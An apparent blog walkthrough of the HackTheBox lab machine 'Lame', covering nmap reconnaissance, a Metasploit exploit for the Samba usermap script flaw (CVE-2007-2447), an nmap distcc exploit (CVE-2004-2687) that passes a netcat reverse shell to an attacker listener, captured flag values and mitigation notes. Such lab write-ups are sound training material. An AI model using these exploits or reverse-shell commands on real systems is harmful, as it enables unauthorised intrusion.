---
title: Lame - HackTheBox Walkthrough
date: 2021-08-31 10:30:00 +/-TTTT
categories: [Penetration Testing, HackTheBox]
tags: [hackthebox, penetration-testing, linux, vulnerability, exploit, writeup]     # TAG names should always be lowercase
---

# Lame - HackTheBox Walkthrough

A comprehensive walkthrough of the Lame machine from HackTheBox, focusing on vulnerability identification and exploitation techniques.

## Table of Contents
{:.no_toc}

1. TOC
{:toc}

## Machine Information

- **Name**: Lame
- **Difficulty**: Easy
- **Operating System**: Linux
- **IP Address**: 10.129.92.217
- **Release Date**: February 7, 2021

## Initial Reconnaissance

### Nmap Scan

```bash
# Create directory for scan results
mkdir nmap

# Run comprehensive Nmap scan with service detection
nmap -sC -p- -sV -oS nmap/basic.out 10.129.92.217
```

### Scan Results

The initial scan revealed several open ports and services:

1. **Port 21**: FTP (vsftpd 2.3.4)
2. **Port 22**: SSH (OpenSSH 4.7p1)
3. **Port 139**: NetBIOS (Samba 3.x-4.x)
4. **Port 445**: Samba (smbd 3.0.20)
5. **Port 3632**: distccd

## Vulnerability Analysis

### Samba Vulnerability

The Samba service (port 445) running version 3.0.20 is known to be vulnerable to the username map script vulnerability. Let's verify this:

```bash
# Search for Samba exploits
searchsploit smb 3.0.20
```

### Exploitation

Using Metasploit to exploit the Samba vulnerability:

```bash
# Start Metasploit in quiet mode
msfconsole -q

# Search for the username map script exploit
search username map script

# Use the exploit module
use exploit/multi/samba/usermap_script

# Configure the exploit parameters
set RHOSTS 10.129.92.217
set RPORT 445
set LHOST 10.10.14.5

# Execute the exploit
run
```

## Post-Exploitation

### Shell Upgrade

After gaining initial access, upgrade to a more stable shell:

```bash
# Check Python version and spawn a better shell
python -c 'import pty;pty.spawn("/bin/bash")'
```

### Flag Collection

```bash
# User flag
cat /home/makis/user.txt
# 44b03ec4176f68146be931dd45a04c9c

# Root flag
cat /root/root.txt
# 3aa08600fd8c0bd9eb6374c3e5a6de23
```

## Alternative Exploitation Path

### Distccd Vulnerability

The distccd service (port 3632) is also vulnerable to command execution:

```bash
# Run vulnerability scan on distccd port
nmap -p 3632 --script vuln -sV -oS nmap/nmap.vul.out 10.129.92.217
```

### Exploitation without Metasploit

```bash
# Set up a listener on the attacker machine
nc -nvlp 1122

# Execute the exploit using Nmap script
nmap -Pn -n -p3632 --script distcc-cve2004-2687 --script-args="distcc-cve2004-2687.cmd='nc 10.10.14.5 1122 -e /bin/bash'" 10.129.92.217
```

## System Information

```bash
# Check system details
uname -a
# Linux 2.6.24-16 server
```

## Technical Analysis

### Samba Vulnerability (CVE-2007-2447)
- **Vulnerability Type**: Command Injection
- **Affected Version**: Samba 3.0.20
- **Exploit Mechanism**: Username map script
- **Impact**: Remote code execution
- **Mitigation**: Update to latest version

### Distccd Vulnerability (CVE-2004-2687)
- **Vulnerability Type**: Command Execution
- **Affected Version**: distccd 3.1 and earlier
- **Exploit Mechanism**: Command injection
- **Impact**: Remote code execution
- **Mitigation**: Update to latest version

## Lessons Learned

1. **Reconnaissance**
   - Always perform comprehensive port scanning
   - Document all discovered services and versions
   - Verify service versions against known vulnerabilities

2. **Vulnerability Assessment**
   - Check for known vulnerabilities in service versions
   - Consider multiple exploitation paths
   - Document all potential attack vectors

3. **Exploitation**
   - Test exploits in a controlled environment
   - Have multiple exploitation methods ready
   - Document successful exploitation steps

4. **Post-Exploitation**
   - Upgrade shell for better interaction
   - Document system information
   - Collect all required flags
   - Clean up after exploitation

## References

- [HackTheBox Lame](https://www.hackthebox.com/home/machines/profile/1)
- [Samba Usermap Script Exploit](https://www.exploit-db.com/exploits/16320)
- [Distccd Vulnerability](https://nvd.nist.gov/vuln/detail/CVE-2004-2687)
- [Samba Security Advisory](https://www.samba.org/samba/security/CVE-2007-2447.html)
- [Distcc Security Advisory](https://distcc.github.io/security.html)

## License

This work is licensed under a [Creative Commons Attribution 4.0 International License](https://creativecommons.org/licenses/by/4.0/).

